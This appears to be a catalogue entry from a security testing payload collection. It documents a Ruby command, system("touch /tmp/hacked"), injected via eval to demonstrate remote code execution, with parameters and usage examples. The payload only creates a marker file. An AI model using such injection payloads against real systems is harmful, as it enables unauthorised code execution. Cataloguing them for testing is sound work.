---
data: system("touch /tmp/hacked")
tags:
  - rce
  - ruby
type: command
executor: ruby
platforms:
  - Linux
id: 9b417fdf-60e5-4c06-bd51-c6a81c8cda49
created_at: '2025-12-14T17:28:28.319Z'
updated_at: '2025-12-14T17:28:28.319Z'
verified: false
validated: true
submitted: true
---
# ruby-system-touch-file

## Command

```ruby
system("touch /tmp/hacked")
```

## Description

Ruby system call executed via eval injection to create a file, demonstrating RCE capability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| system | Executes shell command | Yes |
| "touch /tmp/hacked" | Command to create empty file | Yes |

## Examples

### Basic Usage

```ruby
system("touch /tmp/test")
```

### Advanced Usage

```ruby
system("touch /tmp/hacked")
```

## Expected Output

Creates an empty file at /tmp/hacked with no output if successful.

## Related

- [[Related Procedure]]
